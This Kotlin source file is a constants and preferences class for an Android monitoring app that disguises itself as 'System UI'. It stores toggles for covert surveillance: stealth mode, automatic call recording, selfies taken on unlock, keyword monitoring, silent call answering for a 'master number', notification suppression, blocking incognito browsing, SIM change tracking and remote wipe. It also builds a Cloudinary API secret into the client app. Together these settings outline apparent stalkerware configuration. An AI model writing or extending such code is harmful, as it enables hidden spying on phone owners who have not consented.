package com.devicemonitor.utils

import android.content.Context
import android.content.SharedPreferences
import com.devicemonitor.BuildConfig
import java.util.UUID

object Constants {
    // Application Name (Central Config)
    const val APP_NAME = "System UI"
    
    // Supabase Configuration
    val SUPABASE_URL = BuildConfig.SUPABASE_URL
    val SUPABASE_ANON_KEY = BuildConfig.SUPABASE_ANON_KEY
    val SUPABASE_PUBLISHABLE_KEY = BuildConfig.SUPABASE_PUBLISHABLE_KEY

    // Cloudinary Configuration (for media storage)
    val CLOUDINARY_CLOUD_NAME = BuildConfig.CLOUDINARY_CLOUD_NAME
    val CLOUDINARY_API_KEY = BuildConfig.CLOUDINARY_API_KEY
    val CLOUDINARY_API_SECRET = BuildConfig.CLOUDINARY_API_SECRET

    // Shared Preferences Keys
    private const val PREFS_NAME = "device_monitor_prefs"
    private const val PREF_DEVICE_ID = "device_id"
    private const val PREF_DEVICE_TOKEN = "device_token"
    private const val PREF_STEALTH_MODE_ENABLED = "stealth_mode_enabled"
    private const val PREF_AUTO_CALL_RECORD = "auto_call_record"
    private const val PREF_UNLOCK_SELFIE = "unlock_selfie"
    private const val PREF_MEDIA_SYNC = "media_sync"
    private const val PREF_KEYWORDS = "monitored_keywords"
    private const val PREF_BLOCK_INCOGNITO = "block_incognito_mode"
    private const val PREF_VOICE_TRIGGER = "voice_trigger_enabled"
    private const val PREF_SILENT_ANSWER = "silent_answer_enabled"
    private const val PREF_MASTER_NUMBER = "master_number"
    private const val PREF_NOTIFICATION_SUPPRESSOR = "notification_suppressor_enabled"
    private const val PREF_USAGE_SCHEDULE = "usage_schedule_active"
    private const val PREF_INCOGNITO_APPS = "incognito_block_apps"
    private const val PREF_WIPE_ON_FAILED_LOGINS = "wipe_on_failed_logins"
    private const val PREF_WIFI_ONLY_SYNC = "wifi_only_sync"
    private const val PREF_VPN_ALERT = "vpn_alert_enabled"
    private const val PREF_LAST_IMSI = "last_imsi"

    // New Extreme Control Setters/Getters
    fun isWipeOnFailedLoginsEnabled(context: Context) = getPrefs(context).getBoolean(PREF_WIPE_ON_FAILED_LOGINS, false)
    fun setWipeOnFailedLogins(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_WIPE_ON_FAILED_LOGINS, enabled).apply()

    fun isWifiOnlySyncEnabled(context: Context) = getPrefs(context).getBoolean(PREF_WIFI_ONLY_SYNC, true)
    fun setWifiOnlySync(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_WIFI_ONLY_SYNC, enabled).apply()

    fun isVpnAlertEnabled(context: Context) = getPrefs(context).getBoolean(PREF_VPN_ALERT, true)
    fun setVpnAlert(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_VPN_ALERT, enabled).apply()

    fun getIncognitoBlockApps(context: Context): Set<String> = getPrefs(context).getStringSet(PREF_INCOGNITO_APPS, setOf("com.android.chrome")) ?: emptySet()
    fun setIncognitoBlockApps(context: Context, apps: Set<String>) = getPrefs(context).edit().putStringSet(PREF_INCOGNITO_APPS, apps).apply()

    // Getters and Setters for Extreme Features
    fun isVoiceTriggerEnabled(context: Context) = getPrefs(context).getBoolean(PREF_VOICE_TRIGGER, false)
    fun setVoiceTrigger(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_VOICE_TRIGGER, enabled).apply()

    fun isSilentAnswerEnabled(context: Context) = getPrefs(context).getBoolean(PREF_SILENT_ANSWER, false)
    fun setSilentAnswer(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_SILENT_ANSWER, enabled).apply()

    fun getMasterNumber(context: Context) = getPrefs(context).getString(PREF_MASTER_NUMBER, "") ?: ""
    fun setMasterNumber(context: Context, number: String) = getPrefs(context).edit().putString(PREF_MASTER_NUMBER, number).apply()

    fun isNotificationSuppressorEnabled(context: Context) = getPrefs(context).getBoolean(PREF_NOTIFICATION_SUPPRESSOR, false)
    fun setNotificationSuppressor(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_NOTIFICATION_SUPPRESSOR, enabled).apply()

    fun isUsageScheduleActive(context: Context) = getPrefs(context).getBoolean(PREF_USAGE_SCHEDULE, false)
    fun setUsageSchedule(context: Context, active: Boolean) = getPrefs(context).edit().putBoolean(PREF_USAGE_SCHEDULE, active).apply()
    private const val PREF_THEME_MODE = "theme_mode" // 0: System, 1: Light, 2: Dark
    private const val PREF_LANGUAGE = "language_code"

    // Sync Configuration (Upgraded to 5 Mins)
    const val SYNC_INTERVAL_MINUTES = 5L

    private const val PREF_NOTIF_VARIANT = "notif_variant_index"
    fun getNotifVariant(context: Context) = getPrefs(context).getInt(PREF_NOTIF_VARIANT, 0)
    fun setNotifVariant(context: Context, index: Int) = getPrefs(context).edit().putInt(PREF_NOTIF_VARIANT, index).apply()

    fun isAutoCallRecordEnabled(context: Context) = getPrefs(context).getBoolean(PREF_AUTO_CALL_RECORD, false)
    fun setAutoCallRecord(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_AUTO_CALL_RECORD, enabled).apply()

    fun isUnlockSelfieEnabled(context: Context) = getPrefs(context).getBoolean(PREF_UNLOCK_SELFIE, false)
    fun setUnlockSelfie(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_UNLOCK_SELFIE, enabled).apply()

    fun isMediaSyncEnabled(context: Context) = getPrefs(context).getBoolean(PREF_MEDIA_SYNC, false)
    fun setMediaSync(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_MEDIA_SYNC, enabled).apply()

    fun isIncognitoModeBlocked(context: Context) = getPrefs(context).getBoolean(PREF_BLOCK_INCOGNITO, false)
    fun setBlockIncognitoMode(context: Context, enabled: Boolean) = getPrefs(context).edit().putBoolean(PREF_BLOCK_INCOGNITO, enabled).apply()

    fun getMonitoredKeywords(context: Context): Set<String> = getPrefs(context).getStringSet(PREF_KEYWORDS, emptySet()) ?: emptySet()
    fun setMonitoredKeywords(context: Context, keywords: Set<String>) = getPrefs(context).edit().putStringSet(PREF_KEYWORDS, keywords).apply()

    // Get SharedPreferences
    private fun getPrefs(context: Context): SharedPreferences {
        return try {
            val masterKeyAlias = androidx.security.crypto.MasterKeys.getOrCreate(androidx.security.crypto.MasterKeys.AES256_GCM_SPEC)
            androidx.security.crypto.EncryptedSharedPreferences.create(
                PREFS_NAME,
                masterKeyAlias,
                context,
                androidx.security.crypto.EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                androidx.security.crypto.EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
            )
        } catch (e: Exception) {
            e.printStackTrace()
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        }
    }

    // Get or generate device ID
    fun getDeviceId(context: Context): String {
        val prefs = getPrefs(context)
        var deviceId = prefs.getString(PREF_DEVICE_ID, null)
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString()
            prefs.edit().putString(PREF_DEVICE_ID, deviceId).apply()
        }
        return deviceId
    }

    // Save device ID from Supabase
    fun saveDeviceId(context: Context, deviceId: String) {
        val prefs = getPrefs(context)
        prefs.edit().putString(PREF_DEVICE_ID, deviceId).apply()
    }

    // Get or generate device token
    fun getDeviceToken(context: Context): String {
        val prefs = getPrefs(context)
        var deviceToken = prefs.getString(PREF_DEVICE_TOKEN, null)
        if (deviceToken == null) {
            deviceToken = UUID.randomUUID().toString()
            prefs.edit().putString(PREF_DEVICE_TOKEN, deviceToken).apply()
        }
        return deviceToken
    }

    // Check if stealth mode is enabled
    fun isStealthModeEnabled(context: Context): Boolean {
        val prefs = getPrefs(context)
        return prefs.getBoolean(PREF_STEALTH_MODE_ENABLED, false)
    }

    // Set stealth mode
    fun setStealthModeEnabled(context: Context, enabled: Boolean) {
        val prefs = getPrefs(context)
        prefs.edit().putBoolean(PREF_STEALTH_MODE_ENABLED, enabled).apply()
    }

    // Get last IMSI
    fun getLastImsi(context: Context): String? {
        val prefs = getPrefs(context)
        return prefs.getString(PREF_LAST_IMSI, null)
    }

    // Set last IMSI
    fun setLastImsi(context: Context, imsi: String) {
        val prefs = getPrefs(context)
        prefs.edit().putString(PREF_LAST_IMSI, imsi).apply()
    }

    // Theme Mode
    fun getThemeMode(context: Context): Int {
        return getPrefs(context).getInt(PREF_THEME_MODE, 0)
    }

    fun setThemeMode(context: Context, mode: Int) {
        getPrefs(context).edit().putInt(PREF_THEME_MODE, mode).apply()
    }

    // Language
    fun getLanguage(context: Context): String {
        return getPrefs(context).getString(PREF_LANGUAGE, "en") ?: "en"
    }

    fun setLanguage(context: Context, lang: String) {
        getPrefs(context).edit().putString(PREF_LANGUAGE, lang).apply()
    }
}
